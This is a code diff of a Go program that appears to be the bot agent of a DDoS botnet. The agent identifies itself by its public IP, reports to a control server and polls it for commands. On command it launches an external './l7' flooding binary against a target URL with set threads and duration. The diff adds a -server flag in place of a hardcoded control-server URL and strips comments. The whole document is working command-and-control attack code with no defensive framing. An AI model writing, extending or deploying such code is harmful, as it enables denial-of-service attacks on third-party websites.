@@ -3,6 +3,7 @@ package main
 import (
 	"bytes"
 	"encoding/json"
+	"flag"
 	"fmt"
 	"io/ioutil"
 	"net/http"
@@ -27,8 +28,6 @@ var (
 	status         = "Ready"
 )
 
-// reportStatus sends the agent’s current status ("Ready", "Sending", or "Error")
-// up to the control server.
 func reportStatus(controlURL, agentID string) {
 	mu.Lock()
 	payload := map[string]string{
@@ -41,13 +40,9 @@ func reportStatus(controlURL, agentID string) {
 	_, err := http.Post(controlURL+"/agent-status", "application/json", bytes.NewBuffer(data))
 	if err != nil {
 		fmt.Printf("[AGENT] Failed to POST status: %v\n", err)
-		return
 	}
 }
 
-// executeL7 runs the external "./l7" binary. It updates `status` to "Sending",
-// reports that status, sleeps for `timer` seconds, then kills the process,
-// flips `status` to "Ready", and reports again.
 func executeL7(controlURL, agentID, url string, threads, timer int, customHost string) {
 	mu.Lock()
 	if currentCommand != nil && currentCommand.Process != nil {
@@ -92,9 +87,6 @@ func executeL7(controlURL, agentID, url string, threads, timer int, customHost s
 	}()
 }
 
-// pollControlServer continuously polls /poll-agent?agentID=<agentID> on the control server.
-// Depending on the returned Command.Action, it either starts executeL7, kills an existing L7,
-// or simply reports its current status as a heartbeat.
 func pollControlServer(controlURL, agentID string) {
 	for {
 		pollURL := fmt.Sprintf("%s/poll-agent?agentID=%s", controlURL, agentID)
@@ -131,7 +123,7 @@ func pollControlServer(controlURL, agentID string) {
 			reportStatus(controlURL, agentID)
 
 		case "none":
-			// No new command → send a heartbeat of our current status ("Ready" or "Sending")
+			// No new command → send a heartbeat
 			reportStatus(controlURL, agentID)
 
 		default:
@@ -142,8 +134,6 @@ func pollControlServer(controlURL, agentID string) {
 	}
 }
 
-// getPublicIP queries a public IP‐lookup service (like api.ipify.org) and returns
-// the agent’s external IP address as a string.
 func getPublicIP() (string, error) {
 	const ipService = "https://api.ipify.org?format=text"
 	resp, err := http.Get(ipService)
@@ -165,7 +155,12 @@ func getPublicIP() (string, error) {
 }
 
 func main() {
-	// 1) Get the agent’s public IP address:
+	// 1) Declare the -server flag. Provide a sensible default.
+	defaultServer := "http://localhost:8080"
+	serverFlag := flag.String("server", defaultServer, "Control server URL (e.g. https://example.com)")
+	flag.Parse()
+
+	// 2) Determine public IP, use as agentID
 	ip, err := getPublicIP()
 	if err != nil {
 		fmt.Printf("[AGENT] Could not determine public IP: %v\n", err)
@@ -173,12 +168,13 @@ func main() {
 	}
 	agentID := ip
 
-	controlServerURL := "https://urban-winner-69q4vqqpw62r5jx-8080.app.github.dev"
+	// 3) Use the value of the -server flag
+	controlServerURL := *serverFlag
 	fmt.Printf("[AGENT] %s starting; polling %s\n", agentID, controlServerURL)
 
-	// 2) Let the control server know we exist (initial “Ready”):
+	// 4) Initial “Ready” status
 	reportStatus(controlServerURL, agentID)
 
-	// 3) Begin polling for commands:
+	// 5) Begin polling
 	pollControlServer(controlServerURL, agentID)
 }
